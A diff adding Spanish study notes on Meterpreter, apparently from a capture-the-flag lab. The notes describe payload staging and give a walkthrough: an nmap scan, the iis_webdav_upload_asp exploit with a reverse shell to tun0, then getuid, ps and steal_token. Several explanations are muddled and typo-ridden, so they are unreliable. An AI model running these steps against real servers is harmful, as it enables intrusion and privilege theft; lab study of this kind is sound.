@@ -526,7 +526,67 @@ Para iniciarlo lo evremos en "show payloadsa"
 
 Cuando la explotación esta completa, pasa esto:
 
-- La víctima ejecuta el payload. Usualmnte a bind, una reversa, un 
+- La víctima ejecuta el payload. Usualmnte a bind, una reversa etc.
+- Los stagers se inician.
+- El core de meterpreter se inicializa, entabla el AES-encript fuera del socket y envia un GET, reciviendo la configuración del cliente.
+- Por ultimo meterpreter ejecuta las extensiones. Siempre ejecuta stdapi y ejecuta priv si el modulo y los privilegios estan bien. Todas las extensionesp asan por AES encrypt.
+
+Sin embargo el meterpreter payload. manda y se ejecuta el la máquina victima del sistema, nosotros recibimos la shell Meterpreter. Nosotros inmediatamente podemos utilizar el comando help para ver que disponibilidad tiene la shell
+```
+help
+```
+
+La idea principal es que necesitamos de meterpreter es solo una buena shell directa dentro del SO y que ademas sea funcional. Meterpreter necesita:
+
+- Sigilo
+- Poder
+- Extensibilidad
+
+## Sigilo
+
+Cuando se ejecuta y llega al target, reside dentro de la memoria y no se escribe dentro del disco. Nuevo proceso de creacion entre el meterpreter injecta procesos de compromiso. 
+
+## PODER
+
+Necesita usar un canal de comunicaciones entre los sistemas para que todo funcione correctamente. Lo primero en el momento que spawneamos la shell necesitamos que todo ecriptado tenga el poder de hacer cosas
+
+## EXTENSIBILIDAD
+
+Constanteme necesita que se ejecute aunque la red vaya mal y tenga rebuildear.
+
+## USAR METERPRETER
+
+Ahora que sabemos todo esto, ahora vamos a utilizarlo escaneamos el target
+```
+db_nmap -sV -p- -T% -A ip
+hosts
+services
+```
+Nos metemos en la página y vemos información, encontramos el servicio y buscamos la vulnerabilidad o el exploit
+```
+searcho iis_webdav_upload_asp
+use 0
+show options
+```
+
+## CONFIGURAR EXPLOIT Y PAYLOAD
+
+```
+set RHOST 10.10.10.15
+set LHOST tun0
+run
+```
+Una vez que tenemos la shell, encontramos archivos que pueden ver pero resididos en memoria osea que cuidado con eso. 
+```
+getuid
+ps
+```
+para ver los procesos
+
+```
+steal_token 1836
+getuid
+```
 
 
 
